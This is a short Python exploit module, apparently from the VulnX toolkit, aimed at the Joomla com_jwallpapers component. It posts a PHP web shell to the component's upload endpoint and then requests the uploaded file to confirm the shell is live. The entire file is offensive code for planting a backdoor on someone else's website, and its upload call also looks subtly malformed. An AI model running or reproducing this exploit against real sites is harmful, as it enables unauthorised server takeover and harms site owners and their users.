import re
import requests
import os

def com_jwallpapers(url,headers):
    s = requests.session()
    endpoint = url + "/index.php?option=com_jwallpapers&task=upload"
    img = open('shell/VulnX.php', 'rb')
    name_img= os.path.basename('shell/VulnX.php')
    fieldname = "Filedata"
    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
    data = { fieldname : files ,
             'submit' : 'Upload',
            }
    upload_file = s.post(endpoint,data)
    shellup = url + "/jwallpapers_files/plupload/VulnX.php?Vuln=X"
    checkShell = requests.get(shellup).text
    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
    if statusCheck:
        print('[+] com_jwallpapers ', shellup)
    else:
        print('[-] com_jwallpapers ')